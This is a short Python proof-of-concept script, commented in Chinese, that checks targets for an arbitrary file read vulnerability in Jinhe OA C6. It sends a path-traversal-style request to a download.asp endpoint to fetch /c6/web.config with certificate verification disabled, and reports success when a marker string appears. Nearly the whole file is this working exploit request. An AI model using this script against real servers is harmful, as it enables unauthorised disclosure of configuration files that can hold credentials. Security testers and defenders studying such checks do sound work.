#!/usr/bin/env python
# coding=utf-8
#金和OAC6任意文件读取漏洞
import requests, threading
from termcolor import colored

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''
def pscan_vuln(url):
    urls = url
    global results
    try:
        response = requests.get(url=url + '/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config', verify=False,timeout=20)
        bm=response.encoding #获取网页编码
        response.encoding = bm #设置网页编码
        if 'MicrosoftWebControls' in response.text:
            print(colored('[+]存在金和OAC6任意文件读取漏洞', 'red'))
            results = f'{urls}-->存在金和OAC6任意文件读取漏洞'
        else:
            print('[-]不存在金和OAC6任意文件读取漏洞')
    except:
        print('[-]不存在金和OAC6任意文件读取漏洞')


def jingheOAdile(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results


